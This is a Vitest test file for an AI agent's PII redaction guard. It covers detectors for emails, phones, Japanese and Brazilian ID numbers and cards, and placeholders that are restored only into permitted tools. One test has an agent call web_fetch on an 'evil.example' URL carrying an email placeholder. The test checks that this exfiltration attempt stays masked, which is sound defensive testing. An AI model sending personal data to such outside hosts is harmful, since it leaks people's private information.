import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { AnyAgentTool } from "../agents/pi-tools.types.js";
import type { PolicyDocument } from "./schema.js";
import { subscribeEvidenceSignals, type EvidenceSignal } from "../evidence/bus.js";
import { PolicyEngine } from "./engine.js";
import { wrapToolWithPolicyGuard } from "./guard.js";
import { resolvePolicyLocations } from "./paths.js";
import {
  cnpjOk,
  compileRedactor,
  cpfOk,
  myNumberOk,
  RedactionVault,
  redactText,
  redactToolResult,
  redactToolText,
  resetRedactionVaults,
  restoreValue,
  validateRedactRules,
} from "./redact.js";
import { validatePolicyDocument } from "./schema.js";

let home: string;

beforeEach(() => {
  home = fs.mkdtempSync(path.join(os.tmpdir(), "kolo-redact-"));
  resetRedactionVaults();
});

afterEach(() => {
  fs.rmSync(home, { recursive: true, force: true });
});

const all = compileRedactor({
  detectors: [
    "email",
    "credit-card",
    "jp-my-number",
    "br-cnpj",
    "br-cpf",
    "phone",
    "jp-postal",
    "ip",
  ],
});

function mask(text: string) {
  const counts: Record<string, number> = {};
  const vault = new RedactionVault();
  return { text: redactText(text, all, vault, counts), counts, vault };
}

describe("validators", () => {
  it("accepts valid numbers and rejects near misses", () => {
    expect(myNumberOk("1234 5678 9018")).toBe(true);
    expect(myNumberOk("123456789019")).toBe(false);
    expect(myNumberOk("111111111111")).toBe(false);
    expect(cpfOk("529.982.247-25")).toBe(true);
    expect(cpfOk("529.982.247-26")).toBe(false);
    expect(cpfOk("111.111.111-11")).toBe(false);
    expect(cnpjOk("11.222.333/0001-81")).toBe(true);
    expect(cnpjOk("11.222.333/0001-82")).toBe(false);
  });
});

describe("detectors", () => {
  it("masks Japanese and Brazilian personal data", () => {
    const { text, counts } = mask(
      [
        "mail: tanaka.h@example.co.jp",
        "tel: 03-1234-5678 / 090-1234-5678 / 09012345678",
        "intl: +81 3-1234-5678, +55 (11) 91234-5678",
        "br: (11) 91234-5678",
        "マイナンバー 1234-5678-9018",
        "CPF 529.982.247-25 CNPJ 11.222.333/0001-81",
        "card 4111 1111 1111 1111",
        "〒104-0051",
        "host 192.168.10.20",
      ].join("\n"),
    );
    expect(text).not.toMatch(/tanaka|1234-5678|91234|9018|529\.982|11\.222|4111|104-0051|192\.168/);
    expect(counts).toMatchObject({
      EMAIL: 1,
      MY_NUMBER: 1,
      CPF: 1,
      CNPJ: 1,
      CARD: 1,
      POSTAL: 1,
      IP: 1,
    });
    expect(counts.PHONE).toBe(6);
  });

  it("leaves ordinary numbers alone", () => {
    const sample =
      "Order 12345 shipped 2026-10-16 for 3,480 yen; build 2.0.0; count 529982247; id 123456789019";
    const { text, counts } = mask(sample);
    expect(text).toBe(sample);
    expect(counts).toEqual({});
  });

  it("gives the same value the same placeholder", () => {
    const { text } = mask("a@b.co then c@d.co then a@b.co");
    expect(text).toBe("[[PII:EMAIL:1]] then [[PII:EMAIL:2]] then [[PII:EMAIL:1]]");
  });

  it("custom patterns", () => {
    const r = compileRedactor({
      detectors: [],
      patterns: [{ name: "resident id", regex: "R-\\d{6}" }],
    });
    const counts: Record<string, number> = {};
    expect(redactText("resident R-004211 room 3", r, new RedactionVault(), counts)).toBe(
      "resident [[PII:RESIDENT_ID:1]] room 3",
    );
  });
});

describe("tool results", () => {
  it("masks JSON fields (EN, JA, PT) and detector hits inside values", () => {
    const r = compileRedactor({ fields: ["@personal"] });
    const vault = new RedactionVault();
    const rows = [
      {
        id: 7,
        name: "山田 花子",
        住所: "東京都千代田区丸の内1-1-1",
        room: "305",
        note: "call 090-1111-2222",
      },
      { id: 8, nome: "Maria Souza", data_nascimento: "1941-03-02", room: "306" },
    ];
    const { result, counts } = redactToolResult(
      { content: [{ type: "text", text: JSON.stringify(rows) }], details: { rows } },
      r,
      vault,
    );
    const out = result as { content: Array<{ text: string }>; details: { rows: unknown[] } };
    const parsed = JSON.parse(out.content[0].text);
    expect(parsed[0]).toEqual({
      id: 7,
      name: "[[PII:NAME:1]]",
      住所: "[[PII:FIELD:1]]",
      room: "305",
      note: "call [[PII:PHONE:1]]",
    });
    expect(parsed[1].nome).toBe("[[PII:NOME:1]]");
    expect(parsed[1].data_nascimento).toBe("[[PII:DATA_NASCIMENTO:1]]");
    expect(JSON.stringify(out.details)).not.toContain("山田");
    expect(counts.NAME).toBe(2); // content and details
    expect(vault.valueOf("[[PII:NAME:1]]")).toBe("山田 花子");
  });

  it("masks CSV and TSV columns whose header matches a field", () => {
    const r = compileRedactor({ fields: ["@personal", "inspector"] });
    const vault = new RedactionVault();
    const counts: Record<string, number> = {};
    const csv = [
      "asset,inspector,reading,limit",
      "Press 4,Sato Ken,92,80",
      '"Press 7, line B",Tanaka Yui,61,80',
      "",
    ].join("\n");
    const out = redactToolText(csv, r, vault, counts);
    expect(out).toBe(
      [
        "asset,inspector,reading,limit",
        "Press 4,[[PII:INSPECTOR:1]],92,80",
        '"Press 7, line B",[[PII:INSPECTOR:2]],61,80',
        "",
      ].join("\n"),
    );
    expect(counts.INSPECTOR).toBe(2);
    const tsv = "名前\t部署\n山田 花子\t総務\n";
    expect(redactToolText(tsv, r, vault, {})).toBe("名前\t部署\n[[PII:FIELD:1]]\t総務\n");
    // Prose with commas is not a table.
    const prose = "Dear team, the inspector, Sato Ken, will visit.\nThanks, Mai";
    expect(redactToolText(prose, r, vault, {})).toBe(prose);
  });

  it("restores only known placeholders", () => {
    const vault = new RedactionVault();
    const ph = vault.placeholderFor("EMAIL", "kin@example.jp");
    const counter = { n: 0 };
    expect(
      restoreValue({ to: ph, body: `hi ${ph} and [[PII:EMAIL:99]]`, n: 3 }, vault, counter),
    ).toEqual({ to: "kin@example.jp", body: "hi kin@example.jp and [[PII:EMAIL:99]]", n: 3 });
    expect(counter.n).toBe(2);
  });
});

describe("policy document", () => {
  it("validates data.redact", () => {
    expect(validateRedactRules({ detectors: ["email", "dna"] })[0]).toContain(
      'unknown detector "dna"',
    );
    expect(validateRedactRules({ patterns: [{ name: "x", regex: "(" }] })[0]).toContain(
      "invalid regex",
    );
    expect(validateRedactRules({ patterns: [{ name: "x", regex: "a*" }] })[0]).toContain(
      "empty string",
    );
    const ok = validatePolicyDocument({
      version: 1,
      data: { redact: { fields: ["@personal"], restoreTo: ["message"] } },
    });
    expect(ok.ok).toBe(true);
    const bad = validatePolicyDocument({ version: 1, data: { redact: { colour: "red" } } });
    expect(bad.ok).toBe(false);
  });
});

describe("context guard in the tool wrapper", () => {
  function engineWith(policy: PolicyDocument | null) {
    const e = new PolicyEngine({
      loc: resolvePolicyLocations({ KOLO_HOME: home }),
      mode: "enforce",
      persist: false,
      audit: false,
    });
    e.useDocument(policy);
    return e;
  }

  function tool(name: string, seen: unknown[], reply: string): AnyAgentTool {
    return {
      name,
      description: name,
      parameters: { type: "object", properties: {} },
      execute: async (_id: string, args: Record<string, unknown>) => {
        seen.push(args);
        return { content: [{ type: "text", text: reply }] };
      },
    } as unknown as AnyAgentTool;
  }

  const policy = {
    version: 1,
    data: { redact: { fields: ["@personal"], restoreTo: ["message"], exceptTools: ["clock"] } },
  } as PolicyDocument;

  it("masks results, restores into permitted tools only, and reports to evidence", async () => {
    const engine = engineWith(policy);
    const signals: EvidenceSignal[] = [];
    const off = subscribeEvidenceSignals("agent:care:main", (s) => signals.push(s));
    const ctx = { agentId: "care", workspaceDir: home, sessionKey: "agent:care:main", engine };
    const seenDb: unknown[] = [];
    const seenMsg: unknown[] = [];
    const seenWeb: unknown[] = [];
    const db = wrapToolWithPolicyGuard(
      tool("db_query", seenDb, '[{"name":"Sato Ken","email":"ken@example.jp"}]'),
      ctx,
    );
    const msg = wrapToolWithPolicyGuard(tool("message", seenMsg, "sent"), ctx);
    const web = wrapToolWithPolicyGuard(tool("web_fetch", seenWeb, "ok"), ctx);
    const clock = wrapToolWithPolicyGuard(tool("clock", [], "call 090-1234-5678"), ctx);
    const exec = (t: AnyAgentTool, a: Record<string, unknown>) =>
      (
        t.execute as (
          id: string,
          a: Record<string, unknown>,
        ) => Promise<{ content: Array<{ text: string }> }>
      )("c1", a);

    const r = await exec(db, { sql: "select" });
    expect(r.content[0].text).toBe('[{"name":"[[PII:NAME:1]]","email":"[[PII:EMAIL:1]]"}]');

    await exec(msg, { to: "[[PII:EMAIL:1]]", text: "Dear [[PII:NAME:1]]" });
    expect(seenMsg[0]).toEqual({ to: "ken@example.jp", text: "Dear Sato Ken" });

    await exec(web, { url: "https://evil.example/?q=[[PII:EMAIL:1]]" });
    expect(seenWeb[0]).toEqual({ url: "https://evil.example/?q=[[PII:EMAIL:1]]" });

    expect((await exec(clock, {})).content[0].text).toBe("call 090-1234-5678");

    off();
    const red = signals.filter((s) => s.kind === "redaction");
    expect(red).toEqual([
      {
        kind: "redaction",
        sessionKey: "agent:care:main",
        tool: "db_query",
        counts: { NAME: 1, EMAIL: 1 },
        restored: 0,
      },
      {
        kind: "redaction",
        sessionKey: "agent:care:main",
        tool: "message",
        counts: {},
        restored: 2,
      },
    ]);
  });

  it("is inert without data.redact, and per-session vaults do not leak", async () => {
    const plain = engineWith({ version: 1 } as PolicyDocument);
    const t = wrapToolWithPolicyGuard(tool("db", [], "ken@example.jp"), {
      agentId: "a",
      workspaceDir: home,
      sessionKey: "s1",
      engine: plain,
    });
    const run = (x: AnyAgentTool, a: Record<string, unknown>) =>
      (
        x.execute as (
          id: string,
          a: Record<string, unknown>,
        ) => Promise<{ content: Array<{ text: string }> }>
      )("c", a);
    expect((await run(t, {})).content[0].text).toBe("ken@example.jp");

    const engine = engineWith(policy);
    const seen: unknown[] = [];
    const a = wrapToolWithPolicyGuard(tool("db", [], "ken@example.jp"), {
      agentId: "a",
      workspaceDir: home,
      sessionKey: "s1",
      engine,
    });
    const m = wrapToolWithPolicyGuard(tool("message", seen, "ok"), {
      agentId: "a",
      workspaceDir: home,
      sessionKey: "s2",
      engine,
    });
    await run(a, {});
    await run(m, { to: "[[PII:EMAIL:1]]" });
    expect(seen[0]).toEqual({ to: "[[PII:EMAIL:1]]" });
  });
});
